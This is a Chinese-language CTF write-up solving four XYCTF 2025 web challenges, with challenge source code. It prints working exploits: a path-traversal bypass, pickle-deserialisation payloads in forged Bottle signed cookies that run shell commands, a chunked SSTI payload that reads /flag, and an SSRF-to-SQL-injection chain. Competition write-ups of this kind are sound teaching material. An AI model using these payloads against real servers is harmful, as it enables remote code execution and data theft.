# [XYCTF] 2025  Signin
源码：
```python
# -*- encoding: utf-8 -*-
'''
@File    :   main.py
@Time    :   2025/03/28 22:20:49
@Author  :   LamentXU 
'''
'''
flag in /flag_{uuid4}
'''
from bottle import Bottle, request, response, redirect, static_file, run, route
with open('../../secret.txt', 'r') as f:
    secret = f.read()

app = Bottle()
@route('/')
def index():
    return '''HI'''
@route('/download')
def download():
    name = request.query.filename
    if '../../' in name or name.startswith('/') or name.startswith('../') or '\\' in name:
        response.status = 403
        return 'Forbidden'
    with open(name, 'rb') as f:
        data = f.read()
    return data

@route('/secret')
def secret_page():
    try:
        session = request.get_cookie("name", secret=secret)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=secret)
            return 'Forbidden!'
        if session["name"] == "admin":
            return 'The secret has been deleted!'
    except:
        return "Error!"
run(host='0.0.0.0', port=8080, debug=False)



```
看到`/download`路由存在任意读取，小waf我们绕一下：
```http
?filename=./.././.././.././secret.txt
```
得到密钥：`Hell0_H@cker_Y0u_A3r_Sm@r7`
我们看看cookie的生成逻辑，跟进`get_cookie`函数
```python
    def get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):
        """ Return the content of a cookie. To read a `Signed Cookie`, the
            `secret` must match the one used to create the cookie (see
            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing
            cookie or wrong signature), return a default value. """
        value = self.cookies.get(key)
        if secret:
            # See BaseResponse.set_cookie for details on signed cookies.
            if value and value.startswith('!') and '?' in value:
                sig, msg = map(tob, value[1:].split('?', 1))
                hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()
                if _lscmp(sig, base64.b64encode(hash)):
                    dst = pickle.loads(base64.b64decode(msg))
                    if dst and dst[0] == key:
                        return dst[1]
            return default
        return value or default
```
看到这里还存在反序列化，这是好像想到之前看过关于bottle模板的`get_cookie`造成的反序列化问题
```python
from bottle import cookie_encode
import os
import requests
secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"

class Test:
    def __reduce__(self):
        return (eval, ("""__import__('os').system('cp /f* ./2.txt')""",))

exp = cookie_encode(
    ('session', {"name": [Test()]}),
    secret
)

requests.get('http://gz.imxbt.cn:20458/secret', cookies={'name': exp.decode()})


```
伪造session发包，这里内容是什么不重要，因为根据源码name=admin也不能得到flag
我们的目的是打反序列化，执行我们的命令就好了。
这里官方的脚本好像不行，不知道是不是环境差异
他这里是使用`cookie_encode`直接生成cookie，看了一下源码好像确实差不多的逻辑，但是题目毕竟是用的get_cookie在服务器直接设置cookie，那我们可以按照这个思路，用set_cookie，自己起一个服务生成cookie
```python
from bottle import route, run,response
import os


secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"

class exp():
    def __reduce__(self):
        cmd = "ls />1"
        return (os.system, (cmd,))


@route("/sign")
def index():
    try:
        session = exp()
        response.set_cookie("name", session, secret=secret)
        return "success"
    except:
        return "pls no hax"


if __name__ == "__main__":
    os.chdir(os.path.dirname(__file__))
    run(host="0.0.0.0", port=8081)
```
但是这个脚本生成的cookie在我本地起的环境可以rce，但是题目环境不行，可能是linux和windows有一些差别，只需要在linux上起服务就好了

# [XYCTF] 2025 出题人已疯
源码：
```python
# -*- encoding: utf-8 -*-
'''
@File    :   app.py
@Time    :   2025/03/29 15:52:17
@Author  :   LamentXU 
'''
import bottle
'''
flag in /flag
'''
@bottle.route('/')
def index():
    return 'Hello, World!'
@bottle.route('/attack')
def attack():
    payload = bottle.request.query.get('payload')
    if payload and len(payload) < 25 and 'open' not in payload and '\\' not in payload:
        return bottle.template('hello '+payload)
    else:
        bottle.abort(400, 'Invalid payload')
if __name__ == '__main__':
    bottle.run(host='0.0.0.0', port=5000)
```
还是bottle，看到`return bottle.template('hello '+payload)`
应该是ssti，限制长度+过滤open和\
测试一下确实存在
![](assets/Day%207/file-20251225134741882.png)
学到了一招，在flask里面我们知道可以往`config`里面塞payload，以绕过长度限制，但是`bottle`里面没有`config`
这里我们可以往`os`里面塞，（问了一下ai，好像是os模块内部用字典存储属性，所以我们可以像字典一样操作os）

```python
import requests  
  
url = 'http://challenge.imxbt.cn:32082/attack'  
  
  
payload = "__import__('os').system('cat /f*>a')"  
  
  
p = [payload[i:i+3] for i in range(0,len(payload),3)]  
flag = True  
for i in p:  
    if flag:  
        tmp = f'{{import os;os.a="{i}"}}'  
        flag = False  
    else:  
        tmp = f'{{import os;os.a+="{i}"}}'  
    r = requests.get(url,params={"payload":tmp})  
  
r = requests.get(url,params={"payload":"{{import os;eval(os.a)}}"})  
r = requests.get(url,params={"payload":"{{include('a')}}"}).text  
print(r)
```
这里就是吧payload利用for循环拆开一段一段写入到`os.a`中，最后执行`os.a`就是我们的完整`payload`
最后在包含我们写入的文件，这里浏览器直接访问是不行的，，
好像是因为flask网站中的路由不是根据文件映射的，是代码中写的，所以我们只能用include去包含它。
![](assets/Day%207/file-20251225135917613.png)
# [XYCTF] 2025 出题人又疯
```python
# -*- encoding: utf-8 -*-
'''
@File    :   app.py
@Time    :   2025/03/29 15:52:17
@Author  :   LamentXU 
'''
import bottle
'''
flag in /flag
'''
@bottle.route('/')
def index():
    return 'Hello, World!'
blacklist = [
    'o', '\\', '\r', '\n', 'import', 'eval', 'exec', 'system', ' ', ';' , 'read'
]
@bottle.route('/attack')
def attack():
    payload = bottle.request.query.get('payload')
    if payload and len(payload) < 25 and all(c not in payload for c in blacklist):
        print(payload)
        return bottle.template('hello '+payload)
    else:
        bottle.abort(400, 'Invalid payload')
if __name__ == '__main__':
    bottle.run(host='0.0.0.0', port=5000)
```
这里在上一题基础上又把常用关键字给禁了，这里想到之前学过的斜体字绕过，但是可惜的是不是文件上传，我们要url传参的话，这里就只有两个字符可以使用了
有一个限制就是如果题目直接渲染我们的输入的话，都需要经过URL编码，而斜体字的URL编码一般都会有两个编码值，比如`ª`就是`%c2%aa`，但是模板解析的时候会一个编码对应一个字符，所以很多就用不了，只有`ª (U+00AA)，º (U+00BA)`可以通过去掉前面的`%c2`,使用`%aa,%ba`代替
这里刚好是LamentXU师傅发现的，可能就是考这个点，特意给了`open`
![](assets/Day%207/file-20251225142635108.png)
这里题目环境好像不对，我本地起的环境成功了。
# [XYCTF] 2025 Fate
源码：
```python 
#!/usr/bin/env python3
import flask
import sqlite3
import requests
import string
import json
app = flask.Flask(__name__)
blacklist = string.ascii_letters
def binary_to_string(binary_string):
    if len(binary_string) % 8 != 0:
        raise ValueError("Binary string length must be a multiple of 8")
    binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]
    string_output = ''.join(chr(int(chunk, 2)) for chunk in binary_chunks)
    
    return string_output

@app.route('/proxy', methods=['GET'])
def nolettersproxy():
    url = flask.request.args.get('url')
    if not url:
        return flask.abort(400, 'No URL provided')
    
    target_url = "http://lamentxu.top" + url
    for i in blacklist:
        if i in url:
            return flask.abort(403, 'I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~')
    if "." in url:
        return flask.abort(403, 'No ssrf allowed')
    response = requests.get(target_url)

    return flask.Response(response.content, response.status_code)
def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{code}')))))))")
        found = cur.fetchone()
    return None if found is None else found[0]

@app.route('/')
def index():
    print(flask.request.remote_addr)
    return flask.render_template("index.html")

@app.route('/1337', methods=['GET'])
def api_search():
    if flask.request.remote_addr == '127.0.0.1':
        code = flask.request.args.get('0')
        if code == 'abcdefghi':
            req = flask.request.args.get('1')
            try:
                req = binary_to_string(req)
                print(req)
                req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;)
            except:
                flask.abort(400, "Invalid JSON")
            if 'name' not in req:
                flask.abort(400, "Empty Person's name")

            name = req['name']
            if len(name) > 6:
                flask.abort(400, "Too long")
            if '\'' in name:
                flask.abort(400, "NO '")
            if ')' in name:
                flask.abort(400, "NO )")
            """
            Some waf hidden here ;)
            """

            fate = db_search(name)
            if fate is None:
                flask.abort(404, "No such Person")

            return {'Fate': fate}
        else:
            flask.abort(400, "Hello local, and hello hacker")
    else:
        flask.abort(403, "Only local access allowed")

if __name__ == '__main__':
    app.run(debug=True)

```
通过阅读源码我们知道首先有一个代理的路由`/proxy`
1. 应该是打ssrf的
```python
target_url = "http://lamentxu.top" + url
```
但是这里有一个waf，会在前面加上一个脏数据，我们知道可以添加一个`@`来屏蔽前面的内容如：`http://nihao@baidu.com`会访问到百度，还有一个就是不能出现`.`，而我们需要的是`127.0.0.1`
这里可以用进制转化绕过(十进制：`2130706433`，因为不能出现ascii字符)
2. 然后就可以访问`/1337`路由了
先传入`0="abcdefghi"`，
在传入`1`
3. 这里后面就要打sql注入了，
```sql
cur.execute(f"SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{code}')))))))")
```
根据数据库配置文件可以知道flag的位置
```python
import sqlite3

conn = sqlite3.connect("database.db")
conn.execute("""CREATE TABLE FATETABLE (
  NAME TEXT NOT NULL,
  FATE TEXT NOT NULL
);""")
Fate = [
    ('JOHN', '1994-2030 Dead in a car accident'),
    ('JANE', '1990-2025 Lost in a fire'),
    ('SARAH', '1982-2017 Fired by a government official'),
    ('DANIEL', '1978-2013 Murdered by a police officer'),
    ('LUKE', '1974-2010 Assassinated by a military officer'),
    ('KAREN', '1970-2006 Fallen from a cliff'),
    ('BRIAN', '1966-2002 Drowned in a river'),
    ('ANNA', '1962-1998 Killed by a bomb'),
    ('JACOB', '1954-1990 Lost in a plane crash'),
    ('LAMENTXU', r'2024 Send you a flag flag{FAKE}')
]
conn.executemany("INSERT INTO FATETABLE VALUES (?, ?)", Fate)

conn.commit()
conn.close()

```
payload:
```sql
code = '))))))) union select LAMENTXU FROM FATETABLE where name='LAMENTXU'--+
```
这里的`code`是`name`,而`name`是json传进入的；
所以我们需要
```json
{
	"name":"'))))))) union select LAMENTXU FROM FATETABLE where name='LAMENTXU'--+"
}
```
但是这里`name`中又不能出现`'`、`(`，并且长度不超过`7`这我们要怎么构造闭合呢。
这里学一个新的手法:
```python
cur.execute(f"SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{code}')))))))")
```
这里`{code}`是通过`f-string`传入的，所以不管是什么都会原样传入，我们可以利用这个特性
通过json中嵌套一层字典的形式：
```json
{
	"name":{
	           "'))))))) union select LAMENTXU FROM FATETABLE where name='LAMENTXU'--+":"1"
	}
}
```
这样检查`name`中有没有非法字符串都是把`name`当作`dict`了，
那waf就变成了
1. `name`字典有没有超过6个键值对（只有一个）
2. `name`字典的键里面有没有`'`、`(`（只有`'))))))) union select LAMENTXU FROM FATETABLE where name='LAMENTXU'--+`作为键）
这样就完美绕过waf。
并且`f-string`会把整个:
`{"'))))))) union select LAMENTXU FROM FATETABLE where name='LAMENTXU'--+":"1"}`都原样复制到`{code}`的地方
这样sql语句就变成了：
```sql
SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{code}')))))))

----->

SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{"'))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME='LAMENTXU' --":1}')))))))
```
看到依旧没有改变我们需要的意思。这就打通了。

最后我们要注意，在变为传入json数据后，有一步操作:
```python
				req = binary_to_string(req)
                print(req)
                req = json.loads(req)
```
在`binary_to_string()`之后才会把json存入。
所以我们要仿照这个解密函数，写一个加密函数，这样才能传入我们真正的意思

加密脚本：
```python
def string_to_binary(input_string):
    binary_list = [format(ord(char), '08b') for char in input_string]
    binary_string = ''.join(binary_list)
    return binary_string
print(string_to_binary("""{"name":{"'))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME='LAMENTXU' --":1}}"""))

```

最后payload：
```http
 /proxy?url=@2130706433:8080/1337?1=011110110010001001101110011000010110110101100101001000100011101001111011001000100010011100101001001010010010100100101001001010010010100100101001001000000101010101001110010010010100111101001110001000000101001101000101010011000100010101000011010101000010000001000110010000010101010001000101001000000100011001010010010011110100110100100000010001100100000101010100010001010101010001000001010000100100110001000101001000000101011101001000010001010101001001000101001000000100111001000001010011010100010100111101001001110100110001000001010011010100010101001110010101000101100001010101001001110010000000101101001011010010001000111010001100010111110101111101%260=%2561%2562%2563%2564%2565%2566%2567%2568%2569
```
